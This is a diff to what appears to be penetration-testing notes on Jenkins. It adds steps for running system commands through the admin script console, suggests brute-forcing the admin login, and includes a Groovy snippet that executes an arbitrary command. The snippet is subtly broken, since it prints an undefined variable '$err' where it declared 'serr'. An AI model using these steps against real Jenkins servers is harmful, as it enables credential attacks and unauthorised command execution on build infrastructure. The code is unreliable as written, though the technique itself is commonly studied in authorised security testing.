@@ -255,4 +255,14 @@
 - Jenkins is a widely used Continuous Integration tool.
 - There are many interesting aspects with Jenkings but for now we would limit our discussion to the ability of running system commands on Jenkins.
 - On a windows machine, a jenkins master or jenkins slave needs at least local admin privilege to operate.
-- Login into the Jenkins.
+- Login into the Jenkins. The user should be admin. We can do brute force attack for this.
+- Apart from numerous plugins, there are two ways of executing commands on a Jenkins Master.
+- If you have Admin access (default installation before 2.x), go to `http://<jenkins_server>/script/console`
+- In the script console, Groovy scripts could be executed
+```
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = '[INSERT COMMAND]'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $err"
+```
